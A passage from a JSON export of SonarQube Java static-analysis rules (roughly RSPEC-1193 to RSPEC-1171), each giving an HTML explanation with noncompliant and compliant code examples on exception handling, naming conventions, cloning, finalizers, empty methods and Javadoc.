execution of a block of code. It allows you to\ncatch and handle exceptions gracefully, preventing your program from terminating abruptly.</p>\n<p>The code that may throw an exception is enclosed within the <code>try</code> block, while each <code>catch</code> block specifies the type of\nexception it can handle. The corresponding catch block is executed if the exception matches the type specified in any catch block. It is unnecessary\nto manually check the types using <code>instanceof</code> because Java automatically matches the exception type to the appropriate catch block based\non the declared exception type in the catch clauses.</p>\n<h2>How to fix it</h2>\n<p>Replace <code>if</code> statements that check the exception type using <code>instanceof</code> with corresponding <code>catch</code> blocks.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\ntry {\n  /* ... */\n} catch (Exception e) {\n  if(e instanceof IOException) { /* ... */ }         // Noncompliant\n  if(e instanceof NullPointerException{ /* ... */ }  // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\ntry {\n  /* ... */\n} catch (IOException e) { /* ... */ }                // Compliant\n} catch (NullPointerException e) { /* ... */ }       // Compliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/ERR51-J.+Prefer+user-defined+exceptions+over+more+general+exception+types\">CERT,\n  ERR51-J.</a> - Prefer user-defined exceptions over more general exception types </li>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/essential/exceptions/catch.html\">Oracle - Exceptions</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1193","summary":"Exception types should not be tested using \"instanceof\" in catch blocks","tags":["error-handling","cert","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Duplicated string literals make the process of refactoring complex and error-prone, as any change would need to be propagated on all\noccurrences.</p>\n<h3>Exceptions</h3>\n<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>\n<h2>How to fix it</h2>\n<p>Use constants to replace the duplicated string literals. Constants can be referenced from many places, but only need to be updated in a single\nplace.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>With the default threshold of 3:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void run() {\n  prepare(\"action1\");                              // Noncompliant - \"action1\" is duplicated 3 times\n  execute(\"action1\");\n  release(\"action1\");\n}\n\n@SuppressWarning(\"all\")                            // Compliant - annotations are excluded\nprivate void method1() { /* ... */ }\n@SuppressWarning(\"all\")\nprivate void method2() { /* ... */ }\n\npublic String printInQuotes(String a, String b) {\n  return \"'\" + a + \"'\" + b + \"'\";               // Compliant - literal \"'\" has less than 5 characters and is excluded\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate static final String ACTION_1 = \"action1\";  // Compliant\n\npublic void run() {\n  prepare(ACTION_1);                               // Compliant\n  execute(ACTION_1);\n  release(ACTION_1);\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1192","summary":"String literals should not be duplicated","tags":["design"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"DISTINCT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The classes in the <code>sun.*</code> packages are not part of the official Java API and are not intended for public use. They are internal\nimplementation details specific to the Oracle JDK (Java Development Kit). Therefore, their availability, behavior, or compatibility is not guaranteed\nacross different Java implementations or versions.</p>\n<p>Since these classes are not part of the official Java API, they usually lack proper documentation and support. Finding comprehensive and up-to-date\ninformation about their usage, functionality, and potential limitations can be challenging. This lack of documentation can make it difficult to\nunderstand how to use these classes correctly.</p>\n<p>Classes in the <code>sun.*</code> packages are often platform-dependent and can vary between different operating systems or Java Virtual Machine\n(JVM) implementations. Relying on these classes may lead to code that works on one platform but fails on others, limiting your codeâs portability and\ncross-platform compatibility.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nimport sun.misc.BASE64Encoder; // Noncompliant\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://www.oracle.com/java/technologies/faq-sun-packages.html\">Sun Packages</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1191","summary":"Classes from \"sun.*\" packages should not be used","tags":["lock-in","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Programming languages evolve over time, and new versions of Java introduce additional keywords. If future keywords are used in the current code, it\ncan create compatibility issues when transitioning to newer versions of Java. The code may fail to compile or behave unexpectedly due to conflicts\nwith newly introduced keywords.</p>\n<p>The <code>_</code> keyword was deprecated in Java 9 and disallowed since Java 11. Starting from Java 22 the <code>_</code> was introduced as\n<code>unnamed variable</code>.</p>\n<p>This rule reports an issue when <code>_</code> is used in versions prior to Java 22.</p>\n<h2>How to fix it</h2>\n<p>Rename the <code>_</code> identifiers.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClass {\n    String _ = \"\";            // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyClass {\n    String s = \"\";            // Compliant\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/22/docs/specs/unnamed-jls.html#jls-3.9\">Oracle - Unnamed Variables and Patterns Keywords</a>\n  </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/22/language/unnamed-variables-and-patterns.html\">Oracle - Unnamed Variables and Patterns</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1190","summary":"Future keywords should not be used as names","tags":["obsolete","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared naming conventions make it possible for a team to collaborate efficiently. Following the established convention of single-letter type\nparameter names helps users and maintainers of your code quickly see the difference between a type parameter and a poorly named class.</p>\n<p>This rule check that all type parameter names match a provided regular expression. The following code snippets use the default regular\nexpression.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyClass&lt;TYPE&gt; { // Noncompliant\n  &lt;TYPE&gt; void method(TYPE t) { // Noncompliant\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class MyClass&lt;T&gt; {\n  &lt;T&gt; void method(T t) {\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-119","summary":"Type parameter names should comply with a naming convention","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Anonymous classes are a very convenient and compact way to inject a behavior without having to create a dedicated class. But those anonymous inner\nclasses should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the source code can quickly become\nunreadable.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1188","summary":"Anonymous classes should not have too many lines","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>An empty method is generally considered bad practice and can lead to confusion, readability, and maintenance issues. Empty methods bring no\nfunctionality and are misleading to others as they might think the method implementation fulfills a specific and identified requirement.</p>\n<p>There are several reasons for a method not to have a body:</p>\n<ul>\n  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>\n  <li> It is not yet, or never will be, supported. In this case an exception should be thrown. </li>\n  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>\n</ul>\n<h3>Exceptions</h3>\n<p>This does not raise an issue in the following cases:</p>\n<ul>\n  <li> Methods with a comment to explain why they are empty </li>\n  <li> Non-public default (no-argument) constructors </li>\n  <li> Public default (no-argument) constructors when there are other constructors in the class </li>\n  <li> Empty methods in abstract classes </li>\n  <li> Methods annotated with <code>@org.aspectj.lang.annotation.Pointcut()</code> </li>\n</ul>\n<pre>\npublic abstract class Animal {\n  void speak() {  // default implementation ignored\n  }\n}\n</pre>\n<h2>How to fix it</h2>\n<p>To fix this issue, either make the method do something, throw an exception, or add a comment to explain why it is empty.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void shouldNotBeEmpty() {  // Noncompliant - method is empty\n}\n\npublic void notImplemented() {  // Noncompliant - method is empty\n}\n\n@Override\npublic void emptyOnPurpose() {  // Noncompliant - method is empty\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void doSomething() {\n  doSomething();\n}\n\npublic void notImplemented() {\n  throw new UnsupportedOperationException(\"notImplemented() cannot be performed because ...\");\n}\n\n@Override\npublic void emptyOnPurpose() {\n  // comment explaining why the method is empty\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1186","summary":"Methods should not be empty","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Overriding a method just to call the same method from the super class without performing any other actions is useless and misleading. The only time\nthis is justified is in <code>final</code> overriding methods, where the effect is to lock in the parent class behavior. This rule ignores such\noverrides of <code>equals</code>, <code>hashCode</code> and <code>toString</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void doSomething() {\n  super.doSomething();\n}\n\n@Override\npublic boolean isLegal(Action action) {\n  return super.isLegal(action);\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Override\npublic boolean isLegal(Action action) {         // Compliant - not simply forwarding the call\n  return super.isLegal(new Action(/* ... */));\n}\n\n@Id\n@Override\npublic int getId() {                            // Compliant - there is annotation different from @Override\n  return super.getId();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1185","summary":"Overriding methods should do more than simply call the same method in the super class ","tags":["redundant","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p><code>Cloneable</code> is the marker <code>Interface</code> that indicates that <code>clone()</code> may be called on an object. Overriding\n<code>clone()</code> without implementing <code>Cloneable</code> can be helpful if you want to control how subclasses clone themselves, but otherwise,\nitâs probably a mistake.</p>\n<p>The usual convention for <code>Object.clone()</code> according to Oracleâs Javadoc is:</p>\n<ol>\n  <li> <code>x.clone() != x</code> </li>\n  <li> <code>x.clone().getClass() == x.getClass()</code> </li>\n  <li> <code>x.clone().equals(x)</code> </li>\n</ol>\n<p>Obtaining the object that will be returned by calling <code>super.clone()</code> helps to satisfy those invariants:</p>\n<ol>\n  <li> <code>super.clone()</code> returns a new object instance </li>\n  <li> <code>super.clone()</code> returns an object of the same type as the one <code>clone()</code> was called on </li>\n  <li> <code>Object.clone()</code> performs a shallow copy of the objectâs state. </li>\n</ol>\n<h2>How to fix it</h2>\n<p>Ensure that the <code>clone()</code> method calls <code>super.clone()</code> and implement <code>Cloneable</code> in the class or remove the clone\nmethod.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass BaseClass {  // Noncompliant - should implement Cloneable\n  @Override\n  public Object clone() throws CloneNotSupportedException {    // Noncompliant - should return the super.clone() instance\n    return new BaseClass();\n  }\n}\n\nclass DerivedClass extends BaseClass implements Cloneable {\n  /* Does not override clone() */\n\n  public void sayHello() {\n    System.out.println(\"Hello, world!\");\n  }\n}\n\nclass Application {\n  public static void main(String[] args) throws Exception {\n    DerivedClass instance = new DerivedClass();\n    ((DerivedClass) instance.clone()).sayHello();              // Throws a ClassCastException because invariant #2 is violated\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass BaseClass implements Cloneable {\n  @Override\n  public Object clone() throws CloneNotSupportedException {    // Compliant\n    return super.clone();\n  }\n}\n\nclass DerivedClass extends BaseClass implements Cloneable {\n  /* Does not override clone() */\n\n  public void sayHello() {\n    System.out.println(\"Hello, world!\");\n  }\n}\n\nclass Application {\n  public static void main(String[] args) throws Exception {\n    DerivedClass instance = new DerivedClass();\n    ((DerivedClass) instance.clone()).sayHello();              // Displays \"Hello, world!\" as expected. Invariant #2 is satisfied\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/580\">CWE-580 - clone() Method Without super.clone()</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/FjZGBQ\">CERT, MET53-J.</a> - Ensure that the clone() method calls super.clone() </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1182","summary":"Classes that override \"clone\" should be \"Cloneable\" and call \"super.clone()\"","tags":["convention","cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>Throwable</code> is the superclass of all errors and exceptions in Java. <code>Error</code> is the superclass of all errors, which are not\nmeant to be caught by applications.</p>\n<p>Catching either <code>Throwable</code> or <code>Error</code> will also catch <code>OutOfMemoryError</code> and <code>InternalError</code>, from\nwhich an application should not attempt to recover.</p>\n<h3>Noncompliant code example</h3>\n<pre>\ntry { /* ... */ } catch (Throwable t) { /* ... */ }\ntry { /* ... */ } catch (Error e) { /* ... */ }\n</pre>\n<h3>Compliant solution</h3>\n<pre>\ntry { /* ... */ } catch (RuntimeException e) { /* ... */ }\ntry { /* ... */ } catch (MyException e) { /* ... */ }\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/396\">CWE-396 - Declaration of Catch for Generic Exception</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/ERR08-J.+Do+not+catch+NullPointerException+or+any+of+its+ancestors\">CERT,\n  ERR08-J.</a> - Do not catch NullPointerException or any of its ancestors </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1181","summary":"Throwable and Error should not be caught","tags":["cwe","error-handling","bad-practice","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all\n<code>abstract</code> class names match a provided regular expression. If a non-abstract class match the regular expression, an issue is raised to\nsuggest to either make it abstract or to rename it.</p>\n<h3>Noncompliant code example</h3>\n<p>With the default regular expression: <code>^Abstract[A-Z][a-zA-Z0-9]*$</code>:</p>\n<pre>\nabstract class MyClass { // Noncompliant\n}\n\nclass AbstractLikeClass { // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nabstract class AbstractClass {\n}\n\nclass LikeClass {\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-118","summary":"Abstract class names should comply with a naming convention","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>A good API documentation is a key factor in the usability and success of a software API. It ensures that developers can effectively use, maintain,\nand collaborate on the API.</p>\n<h2>Why is this an issue?</h2>\n<p>Undocumented APIs pose significant challenges in software development for several reasons:</p>\n<ul>\n  <li> <strong>Lack of Clarity:</strong> developers struggling to understand how to use the API correctly. This can lead to misuse and unexpected\n  results. </li>\n  <li> <strong>Increased Development Time:</strong> developers spending extra time reading and understanding the source code, which slows down the\n  development process. </li>\n  <li> <strong>Error Prone:</strong> developers are more likely to make mistakes that lead to bugs or system crashes when the intent or the error\n  handling of an API is not clear. </li>\n  <li> <strong>Difficult Maintenance and Updates:</strong> developers may not understand the existing functionality well enough to add new features\n  without breaking the existing ones. </li>\n  <li> <strong>Poor Collaboration:</strong> collaboration, when there is lack of documentation, leads to confusion and inconsistencies. </li>\n</ul>\n<p>It is recommended to document the API using <strong>JavaDoc</strong> to clarify what is the contract of the API. This is especially important for\npublic APIs, as they are used by other developers.</p>\n<h3>Exceptions</h3>\n<p>The following public methods and constructors are not taken into account by this rule:</p>\n<ul>\n  <li> Getters and setters. </li>\n  <li> Methods overriding another method (usually annotated with <code>@Override</code>). </li>\n  <li> Empty constructors. </li>\n  <li> Static constants. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>On top of a main description for each member of a public API, the following <strong>Javadoc</strong> elements are required to be described:</p>\n<ul>\n  <li> Parameters, using <code>@param parameterName</code>. </li>\n  <li> Thrown exceptions, using <code>@throws exceptionName</code>. </li>\n  <li> Method return values, using <code>@return</code>. </li>\n  <li> Generic types, using <code>@param &lt;T&gt;</code>. </li>\n</ul>\n<p>Furthermore, the following guidelines should be followed:</p>\n<ul>\n  <li> At least 1 line of description. </li>\n  <li> All parameters documented with <code>@param</code>, and names should match. </li>\n  <li> All checked exceptions should be documented with <code>@throws</code> </li>\n  <li> <code>@return</code> present and documented when method return type is not <code>void</code>. </li>\n  <li> Placeholders like <code>\"TODO\"</code>, <code>\"FIXME\"</code>, <code>\"â¦â\"</code> should be avoided. </li>\n</ul>\n<p>For the parameters of the rule, the following rules are applied:</p>\n<ul>\n  <li> <code>?</code> matches a single character </li>\n  <li> <code>*</code> matches zero or more characters </li>\n  <li> <code>**</code> matches zero or more packages </li>\n</ul>\n<p>Examples:</p>\n<ul>\n  <li> <code>java.internal.InternalClass</code> will match only <code>InternalClass</code> class. </li>\n  <li> <code>java.internal.*</code> will match any member of <code>java.internal</code> package. </li>\n  <li> <code>java.internal.**</code> same as above, but including sub-packages. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n/**\n  * This is a Javadoc comment\n  */\npublic class MyClass&lt;T&gt; implements Runnable {   // Noncompliant - missing '@param &lt;T&gt;'\n\n  public static final int DEFAULT_STATUS = 0;   // Compliant - static constant\n  private int status;                           // Compliant - not public\n\n  public String message;                        // Noncompliant\n\n  public MyClass() {                            // Noncompliant - missing documentation\n    this.status = DEFAULT_STATUS;\n  }\n\n  public void setStatus(int status) {           // Compliant - setter\n    this.status = status;\n  }\n\n  @Override\n  public void run() {                           // Compliant - has @Override annotation\n  }\n\n  protected void doSomething() {                // Compliant - not public\n  }\n\n  public void doSomething2(int value) {         // Noncompliant\n  }\n\n  public int doSomething3(int value) {          // Noncompliant\n    return value;\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n/**\n  * This is a Javadoc comment\n  * @param &lt;T&gt; the parameter of the class\n  */\npublic class MyClass&lt;T&gt; implements Runnable {\n\n  public static final int DEFAULT_STATUS = 0;\n  private int status;\n\n  /**\n    * This is a Javadoc comment\n    */\n  public String message;\n\n  /**\n   * Class comment...\n   */\n  public MyClass() {\n    this.status = DEFAULT_STATUS;\n  }\n\n  public void setStatus(int status) {\n    this.status = status;\n  }\n\n  @Override\n  public void run() {\n  }\n\n  protected void doSomething() {\n  }\n\n  /**\n    * Will do something.\n    * @param value the value to be used\n    */\n  public void doSomething(int value) {\n  }\n\n  /**\n    *  {@inheritDoc}\n    */\n  public int doSomething(int value) {\n    return value;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Oracle - <a href=\"https://docs.oracle.com/javase/8/docs/technotes/tools/windows/javadoc.html\">JavaDoc</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Technical Writer HQ - <a href=\"https://technicalwriterhq.com/documentation/api-documentation/how-to-write-api-documentation/\">How to write API\n  documentation</a> </li>\n  <li> FreeCodeCamp - <a href=\"https://www.freecodecamp.org/news/how-to-write-api-documentation-like-a-pro/\">How to write API documentation like a\n  pro</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1176","summary":"Public types, methods and fields (API) should be documented with Javadoc","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p><code>Object.finalize()</code> is called by the Garbage Collector at some point after the object becomes unreferenced.</p>\n<p>In general, overloading <code>Object.finalize()</code> is a bad idea because:</p>\n<ul>\n  <li> The overload may not be called by the Garbage Collector. </li>\n  <li> Users are not expected to call <code>Object.finalize()</code> and will get confused. </li>\n</ul>\n<p>But beyond that itâs a terrible idea to name a method \"finalize\" if it doesnât actually override <code>Object.finalize()</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic int finalize(int someParameter) {        // Noncompliant\n  /* ... */\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic int someBetterName(int someParameter) {  // Compliant\n  /* ... */\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1175","summary":"The signature of \"finalize()\" should match that of \"Object.finalize()\"","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>The contract of the <code>Object.finalize()</code> method is clear: only the Garbage Collector is supposed to call this method.</p>\n<p>Making this method public is misleading, because it implies that any caller can use it.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyClass {\n\n  @Override\n  public void finalize() {    // Noncompliant\n    /* ... */\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/583\">CWE-583 - finalize() Method Declared Public</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1174","summary":"\"Object.finalize()\" should remain protected (versus public) when overriding","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A typical code smell known as unused function parameters refers to parameters declared in a function but not used anywhere within the functionâs\nbody. While this might seem harmless at first glance, it can lead to confusion and potential errors in your code. Disregarding the values passed to\nsuch parameters, the functionâs behavior will be the same, but the programmerâs intention wonât be clearly expressed anymore. Therefore, removing\nfunction parameters that are not being utilized is considered best practice.</p>\n<h3>Exceptions</h3>\n<p>The rule will not raise issues for unused parameters:</p>\n<ul>\n  <li> that are annotated with <code>@javax.enterprise.event.Observes</code> </li>\n  <li> in overrides and implementation methods </li>\n  <li> in interface <code>default</code> methods </li>\n  <li> in non-private methods that only <code>throw</code> or that have empty bodies </li>\n  <li> in annotated methods, unless the annotation is <code>@SuppressWarning(\"unchecked\")</code> or <code>@SuppressWarning(\"rawtypes\")</code>, in\n  which case the annotation will be ignored </li>\n  <li> in overridable methods (non-final, or not member of a final class, non-static, non-private), if the parameter is documented with a proper\n  javadoc. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Having unused function parameters in your code can lead to confusion and misunderstanding of a developerâs intention. They reduce code readability\nand introduce the potential for errors. To avoid these problems, developers should remove unused parameters from function declarations.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid doSomething(int a, int b) { // Noncompliant, \"b\" is unused\n  compute(a);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid doSomething(int a) {\n  compute(a);\n}\n</pre>\n<p>Examples of exceptions:</p>\n<pre>\n@Override\nvoid doSomething(int a, int b) {     // no issue reported on b\n  compute(a);\n}\n\npublic void foo(String s) {\n  // designed to be extended but noop in standard case\n}\n\nprotected void bar(String s) {\n  //open-closed principle\n}\n\npublic void qix(String s) {\n  throw new UnsupportedOperationException(\"This method should be implemented in subclasses\");\n}\n\n/**\n * @param s This string may be used for further computation in overriding classes\n */\nprotected void foobar(int a, String s) { // no issue, method is overridable and unused parameter has proper javadoc\n  compute(a);\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1172","summary":"Unused method parameters should be removed","tags":["cert","unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Non-static initializers, also known as instance initializers, are blocks of code within a class that are executed when an instance of the class is\ncreated. They are executed when an object of the class is created just before the constructor is called. Non-static initializers are useful when you\nwant to perform some common initialization logic for all objects of a class. They allow you to initialize instance variables in a concise and\ncentralized manner, without having to repeat the same initialization code in each constructor.</p>\n<p>While non-static initializers may have some limited use cases, they are rarely used and can be confusing for most developers because they only run\nwhen new class instances are created.</p>\n<h2>How to fix it</h2>\n<p>Non-static initializers should be refactored into standard constructors or field initializers when possible.</p>\n<p>In most cases, the use of constructors, overloaded constructors, or factory methods is preferable for initializing instance variables. These\napproaches provide more explicit and controlled initialization, separate concerns, allow for better error handling, and make the code easier to\nunderstand and maintain.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass MyClass {\n  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;() {\n    {\n      put(\"a\", \"b\");\n    }\n  }; // Noncompliant - HashMap should be extended only to add behavior, not for initialization\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>Using static initialization block:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass MyClass {\n  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;&gt;();\n\n  static {\n    MY_MAP.put(\"a\", \"b\");  // Compliant\n  }\n}\n</pre>\n<p>or using constructor:</p>\n<pre>\nclass MyClass {\n  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;&gt;();\n\n  public MyClass() {\n    MY_MAP.put(\"a\", \"b\");  // Compliant\n  }\n}\n</pre>\n<p>or using Java 9 <code>Map.of</code>:</p>\n<pre>\nclass MyClass {\n  private static final Map&lt;String, String&gt; MY_MAP = java.util.Map.of(\"a\", \"b\");   // 